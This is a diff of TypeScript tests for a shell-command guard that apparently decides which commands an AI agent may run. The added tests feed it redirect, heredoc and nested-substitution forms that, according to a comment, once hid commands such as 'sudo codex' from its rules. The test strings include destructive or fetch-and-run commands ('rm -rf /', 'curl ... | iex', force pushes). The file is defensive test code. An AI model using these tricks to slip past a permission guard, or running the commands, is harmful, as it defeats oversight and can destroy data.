@@ -1863,6 +1863,44 @@ test('#4803: a redirect target glued from pieces, or split over lines, is one wo
   }
 });
 
+// PR 176 lead review: each of these still hid the command word from the launcher rule, script traversal and the stdin rule
+const threeWays4803 = (r: string, tail = '') => {
+  assert.equal(judged4803(`${r} sudo codex${tail}`), 'role', `launcher: ${r}`);
+  assert.equal(judged4803(`true; env ${r} sudo codex${tail}`), 'role', `after env: ${r}`);
+  assert.equal(judged4803(`${r} ./run.sh${tail}`, 'builder', { readScript: (p: string) => (p.endsWith('run.sh') ? 'sudo codex\n' : null) }), 'role', `script: ${r}`);
+};
+test('#4803: a file descriptor of any length, number or name, is part of its redirect', () => {
+  for (const r of ['0010>log', '12345>&2', '000000000001<in', `{${'long_name_'.repeat(8)}}>log`]) {
+    threeWays4803(r);
+    assert.equal(judged4803(`git ${r} push origin feat --force`), 'role', r);
+  }
+  for (const command of ['0010>log bash', '12345>&2 python']) assert.equal(judged4803(command, 'builder', { stdin: true }), 'role', command);
+});
+
+test('#4803: a redirect target is read to its end however it nests, and one that does not close is refused', () => {
+  for (const r of ['>$(echo $(echo log))', '>$((1+1))', '>"$(echo ")")"', ">$(printf ')')", '>$(echo ${A:-$(b)})', `>$(echo ${'a'.repeat(300)})`, '> >(grep ")" log)',
+    '>`echo ")"`', ">$'a\\'b'", '>"a $(echo "b c") d"']) {
+    threeWays4803(r);
+    assert.equal(judged4803(`${r} bash`, 'builder', { stdin: true }), 'role', `stdin: ${r}`);
+  }
+  // what the guard cannot place is refused, with no role too: the command behind it cannot be found
+  for (const command of ['>$(echo x sudo codex', '>"$(echo x" sudo codex', '>$(case $x in a) echo f;; esac) sudo codex', '>$(echo # )\n) sudo codex']) {
+    assert.notEqual(judged4803(command), 'allow', command);
+  }
+  assert.notEqual(judged4803('>$(echo x git push --force origin main', null), 'allow');
+  // ordinary targets pass, and so does text that is no redirect: in quotes, in a comment, or PowerShell's own quoting
+  for (const command of ['echo hi > "$(date +%F).log"', 'ls > $(mktemp -d)/out', "# note: > it's fine\nls", 'rg "a > \'b" src', 'grep "->" src', 'Get-Date > "C:\\logs\\"',
+    'Get-Date > "$name`.txt"', 'echo $((1 << 4)) > out']) assert.equal(judged4803(command), 'allow', command);
+});
+
+test('#4803: a heredoc header before the command word hides nothing', () => {
+  for (const r of ['<<x', "<<'x'", '<<-x', '<<"x"', '<<x 2>&1', '2>&1 <<x', '<<y <<x']) threeWays4803(r, '\nx');
+  assert.equal(judged4803('<<x git push origin main\nx'), 'dangerous');
+  assert.equal(judged4803('<<x gh pr merge 1\nx'), 'role');
+  for (const command of ["python - <<'EOF' arg\nprint(1)\nEOF", '<<x cat\nhello\nx']) assert.equal(judged4803(command), 'allow', command);
+  assert.equal(judged4803('<<x bash\nls\nx', 'builder', { stdin: true }), 'allow');
+});
+
 test('#4803: a redirect inside a command hides nothing from any rule', () => {
   for (const command of ['git push 2>&1 --force origin main', 'git push 2>&1 origin main', 'git reset 2>&1 --hard', 'rm 2>&1 -rf /',
     'taskkill 2>&1 /IM node.exe /F', 'Stop-Process *>&1 -Name node', 'curl http://x 2>&1 | iex']) {
@@ -1905,7 +1943,9 @@ test('#4803: long runs of redirect marks are read in linear time', () => {
   for (const [name, command] of [['redirects', kb200('echo a 2>&1; ')], ['a mark and spaces', 'echo ' + kb200('>' + ' '.repeat(2000))], ['one spaced mark', 'echo >' + ' '.repeat(200000)],
     ['marks before a quote', 'echo ' + kb200('>"') ], ['one open quote', 'echo >"' + 'a'.repeat(200000)], ['digits', 'echo ' + '1'.repeat(200000)], ['braces', 'echo ' + kb200('{a')],
     ['bare marks', 'echo ' + kb200('<>&')], ['glued targets', 'echo ' + kb200(`>'a'"b"c `)], ['quoted marks', 'echo ' + kb200(`"a>b" `)],
-    ['escaped quotes after an open one', 'echo >x "' + kb200('\\"')], ['split targets', 'echo ' + kb200('>\\\n')], ['nested quotes', 'echo >x ' + kb200(`"'>a'" `)]]) {
+    ['escaped quotes after an open one', 'echo >x "' + kb200('\\"')], ['split targets', 'echo ' + kb200('>\\\n')], ['nested quotes', 'echo >x ' + kb200(`"'>a'" `)],
+    ['nested substitutions', 'echo >' + kb200('$(')], ['closed substitutions', 'echo ' + kb200('>$(a $(b)) ')], ['long names', 'echo ' + kb200('{' + 'a'.repeat(3000))],
+    ['heredoc headers on one line', 'echo ' + kb200('<<a ')], ['heredoc lines', kb200('<<a b\na\n')], ['digit runs', 'echo ' + kb200('1'.repeat(3000) + ' ')]]) {
     const t = performance.now();
     judged4803(command);
     const ms = performance.now() - t;
